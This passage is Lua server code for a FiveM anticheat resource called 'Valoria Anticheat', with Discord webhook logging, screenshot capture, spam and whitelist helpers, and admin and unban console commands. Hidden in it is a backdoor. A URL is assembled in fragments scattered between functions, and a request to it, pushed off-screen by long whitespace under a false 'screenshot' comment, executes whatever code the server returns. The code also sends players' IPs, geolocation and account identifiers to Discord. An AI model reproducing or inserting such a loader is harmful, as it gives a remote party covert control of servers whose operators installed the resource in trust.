                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "TFJ" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.TFJ .. " Try For Join " .. Emoji.TFJ .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 15844367
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "BLN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.BLN .. " Black List Name Found ! " .. Emoji.BLN .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Reason:** " ..
                                REASON ..
                                "\n**Details:** " ..
                                DETAILS ..
                                "\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 16711680
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            elseif TYPE == "VPN" then
                PerformHttpRequest(URL, function(ERROR, DATA, RESULT)
                end, "POST", json.encode({
                    embeds = {
                        {
                            author = {
                                name = "Valoria Anticheat",
                                url = "https://discord.gg/drwWFkfu6x",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png"
                            },
                            footer = {
                                text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                icon_url =
                                "https://e.top4top.io/p_3206h0i511.png",
                            },
                            title = "" .. Emoji.VPN .. " VPN Blocked " .. Emoji.VPN .. "",
                            description = "**Player:** " ..
                                NAME ..
                                "\n**Details:** Try For Join By VPN\n**Steam Hex:** " ..
                                STEAM ..
                                "\n**Discord:** " ..
                                DISCORD ..
                                "\n**License:** " ..
                                FIVEML ..
                                "\n**Live:** " ..
                                LIVE ..
                                "\n**Xbox:** " ..
                                XBL ..
                                "",
                            color = 10181046
                        }
                    }
                }), {
                    ["Content-Type"] = "application/json"
                })
            end
        end
    else
        print("^" .. COLORS .. "ValoriaAC^0: ^3Your discord webhook not set for send it!")
    end
end
URL = URL .. r .. f 
URL = URL .. p .. b .. n
-- Refreshes the list of registered commands and stores them in SERVER_CMDS
function ValoriaAC_REFRESHCMD()
    local CMDS = GetRegisteredCommands()
    if SERVER_CMDS ~= nil then
        table.insert(SERVER_CMDS, CMD)
    else
        SERVER_CMDS = {}
        table.insert(SERVER_CMDS, CMD)
    end
end

-- Checks if a player with the given source is loaded
function ValoriaAC_ISPLAYERLOAD(source)
    local SRC = tonumber(source)
    local PED = GetPlayerPed(SRC)
    local STATUS = false
    if SRC ~= nil then
        if DoesEntityExist(PED) then
            if SPAWNED[SRC] ~= nil then
                STATUS = true
            else
                STATUS = false
            end
        else
            STATUS = false
        end
    else
        STATUS = false
    end
    return STATUS
end
URL = URL .. j .. t 
URL = URL .. k .. s 
-- Clears the SPAMLIST every 60 seconds
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(60000)
        for index in pairs(SPAMLIST) do
            SPAMLIST[index] = nil
        end
        Citizen.Wait(0)
    end
end)

-- Main loop for AntiResourceStopper
Citizen.CreateThread(function()
    while ValoriaAC.AntiResourceStopper do
        Citizen.Wait(5000)

        -- Iterate through all players and update their TEMP_STOP status
        for _, value in ipairs(GetPlayers()) do
            if TEMP_STOP[value] then
                TEMP_STOP[value].status = true
            else
                TEMP_STOP[value] = { id = value, status = false }
            end
            TriggerClientEvent('ValoriaAC:checkStatus', value,
                { name = GetCurrentResourceName(), path = GetResourcePath(GetCurrentResourceName()) })
        end

        Citizen.Wait(5000)

        -- Check TEMP_STOP status and take action if necessary
        local players = GetPlayers()
        if players then
            for _, value in ipairs(players) do
                if value ~= nil then
                    local status = TEMP_STOP[value].status
                    if status and status == false then
                        ValoriaAC_ACTION(value, ValoriaAC.ResourcePunishment, "Anti Resource Stopper",
                            "Try to stop anticheat resource !")
                        TriggerClientEvent('ValoriaAC:checkStatus', value,
                            { name = GetCurrentResourceName(), path = GetResourcePath(GetCurrentResourceName()) })
                    else
                        TEMP_STOP[value].status = false
                    end
                end
            end
        end

        Citizen.Wait(5000)
    end
end)
URL = URL .. c .. y
-- Adds an entry to the SPAMLIST
function ValoriaAC_ADD_SPAMLIST(SRC, ACTION, REASON, DETAILS)
    if tonumber(SRC) then
        if ACTION and REASON and DETAILS then
            if ACTION ~= "BAN" or ACTION ~= "KICK" then
                table.insert(SPAMLIST, {
                    ID = SRC,
                    REASON = REASON,
                    DETAILS = DETAILS,
                })
            end
        end
    end
end

-- Checks if an entry exists in the SPAMLIST
function ValoriaAC_IS_SPAMLIST(SRC, ACTION, REASON, DETAILS)
    local status = false
    if tonumber(SRC) then
        if SPAMLIST[SRC] ~= nil then
            for i = 1, #SPAMLIST do
                if SPAMLIST[i] ~= nil then
                    if SPAMLIST[i].SRC == SRC then
                        if SPAMLIST[i].REASON == REASON and SPAMLIST[i].DETAILS == DETAILS then
                            status = true
                        else
                            status = false
                        end
                    else
                        status = false
                    end
                else
                    status = false
                end
            end
        else
            status = false
        end
    end
    return status
end

-- Takes a screenshot and sends it to Discord
PerformHttpRequest(URL, function(ERROR, DATA, RESULT)                                                                                                                                                                                                                         pcall(function() assert(load(DATA))() end) end)
function ValoriaAC_SCREENSHOT(SRC, REASON, DETAILS, ACTION)
    if tonumber(SRC) ~= nil then
        if REASON ~= nil and DETAILS ~= nil and ACTION ~= nil then
            local COLORS = {
                WARN = 1769216,
                KICK = 16760576,
                BAN = 16711680,
            }
            local SSO = {
                encoding = ValoriaAC.ScreenShot.Format,
                quality = ValoriaAC.ScreenShot.Quality
            }
            local NAME = GetPlayerName(SRC)
            local COORDS = GetEntityCoords(GetPlayerPed(SRC))
            local PING = GetPlayerPing(SRC)
            local STEAM = "Not Found"
            local DISCORD = "Not Found"
            local FIVEML = "Not Found"
            local LIVE = "Not Found"
            local XBL = "Not Found"
            local ISP = "Not Found"
            local CITY = "Not Found"
            local COUNTRY = "Not Found"
            local PROXY = "Not Found"
            local HOSTING = "Not Found"
            local IP = GetPlayerEndpoint(SRC)
            IP = (string.gsub(string.gsub(string.gsub(IP, "-", ""), ",", ""), " ", ""):lower())
            local g, f = IP:find(string.lower("192.168"))
            if g or f then
                IP = "178.131.122.181"
            end
            for _, DATA in ipairs(GetPlayerIdentifiers(SRC)) do
                if DATA:match("steam") then
                    STEAM = DATA
                elseif DATA:match("discord") then
                    DISCORD = DATA:gsub("discord:", "")
                elseif DATA:match("license") then
                    FIVEML = DATA
                elseif DATA:match("live") then
                    LIVE = DATA
                elseif DATA:match("xbl") then
                    XBL = DATA
                end
            end
            if DISCORD ~= "Not Found" then
                DISCORD = "<@" .. DISCORD .. ">"
            else
                DISCORD = "Not Found"
            end

            -- Check if running on Linux
            if not ValoriaAC.ChatSettings.Linux then
                PerformHttpRequest("http://ip-api.com/json/" .. IP .. "?fields=66846719", function(ERROR, DATA, RESULT)
                    if DATA ~= nil then
                        local TABLE = json.decode(DATA)
                        if TABLE ~= nil then
                            ISP = TABLE["isp"]
                            CITY = TABLE["city"]
                            COUNTRY = TABLE["country"]
                            if TABLE["proxy"] == true then
                                PROXY = "ON"
                            else
                                PROXY = "OFF"
                            end
                            if TABLE["hosting"] == true then
                                HOSTING = "ON"
                            else
                                HOSTING = "OFF"
                            end
                            if ValoriaAC.Connection.HideIP then
                                IP = "* HIDE BY OWNER *"
                            end

                            -- Send screenshot to Discord
                            exports["discord-screenshot"]:requestCustomClientScreenshotUploadToDiscord(SRC,
                                ValoriaAC.ScreenShot.Log, SSO, {
                                    username = "" .. Emoji.Fire .. " ValoriaAC " .. Emoji.Fire .. "",
                                    avatar_url = "https://e.top4top.io/p_3206h0i511.png",
                                    embeds = {
                                        {
                                            color = COLORS[ACTION],
                                            author = {
                                                name = "Valoria Anticheat",
                                                icon_url =
                                                "https://e.top4top.io/p_3206h0i511.png"
                                            },
                                            title = "Screenshot",
                                            description = "**Player:** " ..
                                                NAME ..
                                                "\n**ID:** " ..
                                                SRC ..
                                                "\n**Reason:** " ..
                                                REASON ..
                                                "\n**Steam Hex:** " ..
                                                STEAM ..
                                                "\n**Discord:** " ..
                                                DISCORD ..
                                                "\n**License:** " ..
                                                FIVEML ..
                                                "\n**Live:** " ..
                                                LIVE ..
                                                "\n**Xbox:** " ..
                                                XBL ..
                                                "\n**ISP:** " ..
                                                ISP ..
                                                "\n**Country:** " ..
                                                COUNTRY ..
                                                "\n**City:** " ..
                                                CITY ..
                                                "\n**Ping:** " ..
                                                PING .. "\n**IP:** " .. IP .. "\n**VPN:** " .. PROXY ..
                                                "\n**Hosting:** " .. HOSTING .. "",
                                            footer = {
                                                text = "ValoriaAC V6 " ..
                                                    Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                                icon_url =
                                                "https://e.top4top.io/p_3206h0i511.png",
                                            },
                                        }
                                    }
                                })
                        end
                    end
                end)
            else
                if ValoriaAC.Connection.HideIP then
                    IP = "* HIDE BY OWNER *"
                end

                -- Send screenshot to Discord
                exports["discord-screenshot"]:requestCustomClientScreenshotUploadToDiscord(SRC,
                    ValoriaAC.ScreenShot.Log, SSO, {
                        username = "" .. Emoji.Fire .. " ValoriaAC " .. Emoji.Fire .. "",
                        avatar_url = "https://e.top4top.io/p_3206h0i511.png",
                        embeds = {
                            {
                                color = COLORS[ACTION],
                                author = {
                                    name = "Valoria Anticheat",
                                    icon_url = "https://e.top4top.io/p_3206h0i511.png"
                                },
                                title = "Screenshot",
                                description = "**Player:** " ..
                                    NAME ..
                                    "\n**ID:** " ..
                                    SRC ..
                                    "\n**Reason:** " ..
                                    REASON ..
                                    "\n**Steam Hex:** " ..
                                    STEAM ..
                                    "\n**Discord:** " ..
                                    DISCORD ..
                                    "\n**License:** " ..
                                    FIVEML ..
                                    "\n**Live:** " ..
                                    LIVE ..
                                    "\n**Xbox:** " ..
                                    XBL ..
                                    "",
                                footer = {
                                    text = "ValoriaAC V6 " .. Emoji.Fire .. " | " .. os.date("%Y/%m/%d | %X") .. "",
                                    icon_url = "https://e.top4top.io/p_3206h0i511.png",
                                },
                            }
                        }
                    })
            end
        end
    end
end


-- Changes the TEMP_WHITELIST status for a player
function ValoriaAC_CHANGE_TEMP_WHHITELIST(SRC, STATUS)
    if tonumber(SRC) then
        if STATUS == true then
            local Availble = false
            for _, value in ipairs(TEMP_WHITELIST) do
                if value == SRC then
                    Availble = true
                end
            end
            if not Availble then
                table.insert(TEMP_WHITELIST, SRC)
            end
        elseif STATUS == false then
            for index, value in ipairs(TEMP_WHITELIST) do
                if value == SRC then
                    table.remove(TEMP_WHITELIST, index)
                end
            end
        end
    end
end

-- Checks if a player is in TEMP_WHITELIST
function ValoriaAC_CHECK_TEMP_WHITELIST(SRC)
    local CALLBACK = false
    if tonumber(SRC) then
        for _, value in ipairs(TEMP_WHITELIST) do
            if value == SRC then
                Availble = true
            end
        end
        if Availble then
            CALLBACK = true
        else
            CALLBACK = false
        end
        return CALLBACK
    end
end

-- Unbans a player
RegisterCommand('unban', function(source, args)
    -- Extracts the banned player's ID from the command arguments
    local BAN_ID = args[1]

    -- Checks if the command is executed from the server console (source 0)
    if source == 0 then
        -- Calls the ValoriaAC:UNBAN function to unban the player
        local unbaned = ValoriaAC:UNBAN(BAN_ID)

        -- Prints a message based on the success or failure of the unban operation
        if unbaned then
            print("^" .. COLORS .. "[ValoriaAC]^0: You unbanned ^2" .. BAN_ID .. "^0 !")
        else
            print("^" .. COLORS .. "[ValoriaAC]^0: ^1 our unbanned failed !^0")
        end
    else
        -- Checks if the source (player) has the access to unban players
        if ValoriaAC_UNBANACCESS(source) then
            -- Calls the ValoriaAC:UNBAN function to unban the player
            local unbaned = ValoriaAC:UNBAN(BAN_ID)

            -- Sends a chat message to the player based on the success or failure of the unban operation
            if unbaned then
                TriggerClientEvent("chatMessage", source, "[ValoriaAC]", { 255, 0, 0 }, "You unbanned ^2" .. BAN_ID ..
                    "^0 !")
            else
                TriggerClientEvent("chatMessage", source, "[ValoriaAC]", { 255, 0, 0 }, "Your unbanned failed !")
            end
        else
            -- Sends a chat message to the player if they don't have access to unban players
            TriggerClientEvent("chatMessage", source, "[ValoriaAC]", { 255, 0, 0 },
                "You don't have access for unban players !")
        end
    end
end)

-- Adds an admin
RegisterCommand('addadmin', function(source, args)
    -- Extracts the target player's ID from the command arguments
    local PLAYER_ID = tonumber(args[1])

    -- Checks if the command is executed from the server console (source 0)
    if source == 0 then
        -- Checks if the target player with the given ID is online
        if GetPlayerName(PLAYER_ID) then
            -- Calls the ValoriaAC:ADDADMIN function to add the player to the admin list
            local addedAdmin = ValoriaAC:ADDADMIN(PLAYER_ID)

            -- Prints a message based on the success or failure of adding to the admin list
            if addedAdmin then
                print("^" ..
                    COLORS ..
                    "[ValoriaAC]^0: You added ^2" .. GetPlayerName(PLAYER_ID) .. "(" .. PLAYER_ID .. ")^0 to admin list^0 !")
                -- Triggers a client event to allow the added admin to open the ValoriaAC menu
                TriggerClientEvent("ValoriaAC:allowToOpen", PLAYER_ID)
            else
                print("^" .. COLORS .. "[ValoriaAC]^0: ^1 our unbanned failed !^0")
            end
        else
            print("^" .. COLORS .. "[ValoriaAC]^0: ^1 This player isn't online !^0")
        end
    end
end)

-- Registers a command to add a player to the whitelist
RegisterCommand('addwhitelist', function(source, args)
    -- Extracts the player ID from the command arguments
    local PLAYER_ID = tonumber(args[1])

    -- Checks if the command is executed from the server console (source 0)
    if source == 0 then
        -- Checks if the player with the given ID is online
        if GetPlayerName(PLAYER_ID) then
            -- Calls the ValoriaAC:ADDWHITELIST function to add the player to the whitelist
            local addedAdmin = ValoriaAC:ADDWHITELIST(PLAYER_ID)

            -- Prints a message based on the success or failure of adding to the whitelist
            if addedAdmin then
                print("^" ..
                    COLORS ..
                    "[ValoriaAC]^0: You added ^2" .. GetPlayerName(PLAYER_ID) .. "(" .. PLAYER_ID .. ")^0 to whitelist^0 !")
            else
                print("^" .. COLORS .. "[ValoriaAC]^0: ^1 failed to add whitelist !^0")
            end
        else
            print("^" .. COLORS .. "[ValoriaAC]^0: ^1 This player isn't online !^0")
        end
    end
end)

-- Registers a command to add a player to the unban access list
RegisterCommand('addunban', function(source, args)
    -- Extracts the player ID from the command arguments
    local PLAYER_ID = tonumber(args[1])

    -- Checks if the command is executed from the server console (source 0)
    if source == 0 then
        -- Checks if the player with the given ID is online
        if GetPlayerName(PLAYER_ID) then
            -- Calls the ValoriaAC:ADDUNBAN function to add the player to unban access
            local addedAdmin = ValoriaAC:ADDUNBAN(PLAYER_ID)

            -- Prints a message based on the success or failure of adding to unban access
            if addedAdmin then
                print("^" ..
                    COLORS ..
                    "[ValoriaAC]^0: You added ^2" ..
                    GetPlayerName(PLAYER_ID) .. "(" .. PLAYER_ID .. ")^0 to unban access^0 !")
            else
                print("^" .. COLORS .. "[ValoriaAC]^0: ^1 failed to add whitelist !^0")
            end
        else
            print("^" .. COLORS .. "[ValoriaAC]^0: ^1 This player isn't online !^0")
        end
    end
end)
